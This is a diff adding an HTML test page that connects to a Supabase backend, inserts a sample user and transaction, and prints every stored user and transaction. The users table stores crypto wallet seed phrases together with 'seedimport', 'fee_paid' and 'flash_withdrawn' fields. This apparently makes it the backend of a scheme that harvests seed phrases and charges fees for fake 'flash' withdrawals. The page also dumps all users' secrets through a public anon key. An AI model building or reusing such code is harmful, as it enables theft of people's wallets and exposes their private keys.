@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head><title>Supabase Test</title></head>
+<body style="background:#0a0e17;color:#fff;font-family:monospace;padding:40px;">
+<h2>Supabase Connection Test</h2>
+<pre id="result">Testing...</pre>
+<script type="module">
+    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm';
+
+    const SUPABASE_URL = 'https://gypztvofzhpztuehcsi.supabase.co';
+    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd5cHp0dm9memhwenR1ZWVoY3NpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ4MTk5NjQsImV4cCI6MjEwMDM5NTk2NH0.u8qSV0Y2FI2jfWEAG5nO9ZNhoOJeDV-2F4-mAcwupJE';
+
+    const sb = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    const resultEl = document.getElementById('result');
+
+    try {
+        // Test 1: Insert test user
+        const { data: insertData, error: insertError } = await sb.from('users').upsert({
+            email: 'test@demo.com',
+            seed_phrase: 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about',
+            wallet_address: '0x742d35Cc6634C0532925a3b844Bc9e7595f2bD38',
+            network: 'ERC20',
+            native_balance: '0.05',
+            usdt_balance: '150.00',
+            wallet_type: 'seedimport',
+            fee_paid: false,
+            flash_withdrawn: false,
+            flash_amount: 0
+        }, { onConflict: 'email' });
+
+        if (insertError) throw insertError;
+
+        // Test 2: Read users
+        const { data: users, error: readError } = await sb.from('users').select('*');
+        if (readError) throw readError;
+
+        // Test 3: Insert transaction
+        const { error: txError } = await sb.from('transactions').insert({
+            user_email: 'test@demo.com',
+            type: 'Fee Payment',
+            amount: 0.02,
+            currency: 'ETH',
+            network: 'ERC20',
+            tx_hash: '0xtest123...',
+            status: 'completed'
+        });
+        if (txError) throw txError;
+
+        // Test 4: Read transactions
+        const { data: txs, error: txReadError } = await sb.from('transactions').select('*');
+        if (txReadError) throw txReadError;
+
+        resultEl.innerHTML = `<span style="color:#00FF41;">
+✅ Connection: SUCCESS
+✅ Insert User: OK
+✅ Read Users: ${users.length} found
+✅ Insert Transaction: OK
+✅ Read Transactions: ${txs.length} found
+
+Users:
+${JSON.stringify(users, null, 2)}
+
+Transactions:
+${JSON.stringify(txs, null, 2)}
+</span>`;
+
+    } catch (err) {
+        resultEl.innerHTML = `<span style="color:#FF4444;">❌ ERROR: ${err.message}\n\n${JSON.stringify(err, null, 2)}</span>`;
+    }
+</script>
+</body>
+</html>
